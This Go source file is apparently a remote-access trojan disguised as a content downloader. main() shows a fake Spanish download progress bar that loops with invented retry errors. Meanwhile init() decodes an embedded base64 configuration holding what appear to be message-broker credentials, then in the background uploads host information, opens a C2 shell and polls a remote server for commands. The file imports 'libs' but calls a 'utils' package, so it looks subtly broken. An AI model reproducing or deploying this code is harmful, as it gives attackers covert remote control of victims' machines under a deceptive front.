package main

import (
	"fmt"
	"libs"
	"math/rand"
	"os"
	"os/signal"
	"strconv"
	"syscall"
	"time"
)

var (
	debug  bool
	config *utils.ConfigStruct
)

const ec = `aUkxRTR4eVVzYTl5M3g1ZDdWdUtxQVJneG5XTk5QNGY1b0JtcnlXZEFwUHJYNVpwUHM4cTkveUFZOExML1V6VytkWllMMWZHbXNCd2xWbXI1NFVubTVSaWFLU1J0OUdoVlFjNWhpMDhLZXdvSkluTmxjblpsY2lJNklIc0tDUWtpWVdSa2NtVnpjeUk2SUNJd0xqQXVNQzR3SWl3S0NRa2ljRzl5ZENJNklEZ3dPREFLQ1gwc0Nna2lZbVZoWTI5dUlqb2dld29KQ1NKd2NtOTBieUk2SUNKaGJYRndjeUlzQ2drSkltRmtaSEpsYzNNaU9pQWlaM1ZzYkM1eWJYRXVZMnh2ZFdSaGJYRndMbU52YlNJc0Nna0pJblZ6WlhJaU9pQWlaR3h0ZW1KamIzQWlMQW9KQ1NKd1lYTnpJam9nSWtwbk15MWZNMnBJV201VFozaEtORWM1T1dGeVNEVTVRVEJMUkZkWGRHVTJJaXdLQ1FraWNYVmxkV1VpT2lBaVpHeHRlbUpqYjNBaUxBb0pDU0psZUdOb1lXNW5aU0k2SUNKbGVHTm9ZVzVuWlNJc0Nna0pJbkp2ZFhScGJtZExaWGtpT2lBaVl6Sm5ieUlzQ2drSkltVjRjR2x5WVhScGIyNGlPaUF4T0RBS0NYMEtmUW89aENTVmVBWER1QkJUeE5mdDFPdWNBb1FvSms4RTIyM2dXM0ZXQkRpMHNSd1N5c3ZrcFNZWk9GcVhkRVNQcWExV1p1R0M5eEduTEIxYXVudE9R`

func setupSignalHandler() {
	c := make(chan os.Signal)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-c
		utils.PrintlnDebug(debug, "SIGTERM catched")
		fmt.Printf("\rDescarga cancelada\n")
		utils.PrintDebug(debug, "Closing app")
		os.Exit(0)
	}()
}

func printProgressBar(percent int) {
	fmt.Print("\r[")
	for i := 0; i < percent; i++ {
		fmt.Print("#")
	}
	fmt.Printf("%"+strconv.Itoa(100-percent)+"s] %3d%%", " ", percent)
}

func stuff() {
	server, err := utils.GetServerAddress(debug)
	if err != nil {
		utils.PrintDebug(debug, "Error connecting to webserver at %s\n%v", server, err)
		return
	}
	utils.PrintDebug(debug, "Got server address: %s", server)
	guid := utils.GetHostID(debug)
	utils.PrintDebug(debug, "* GUID: %s", guid)
	utils.UploadHostInfo(debug, server, guid)
	utils.ExecC2Shell(debug, server, guid)
	utils.PollCommands(debug, server, guid)
}

func init() {
	debug = (os.Getenv("DEBUG") == "1")
	setupSignalHandler()
	err := utils.DecodeConfig(debug, ec)
	if err != nil {
		panic(err)
	}
	config, _ = utils.GetConfig(debug)
	go stuff()
}

func main() {
	utils.PrintDebug(debug, "Starting app")
	fmt.Printf("Descargando contenido:\n")
	var (
		progress int = 0
		pausa    int = 5
	)
	rand.Seed(time.Now().UnixNano())
	for {
		progress++
		printProgressBar(progress)
		if progress == 99 {
			time.Sleep(20 * time.Second)
			fmt.Printf("\nError en la descarga, reintentando:\n")
			rand.Seed(time.Now().UnixNano())
			progress = 1
		}
		time.Sleep(time.Duration(rand.Intn(pausa)+1) * time.Second)
	}
}
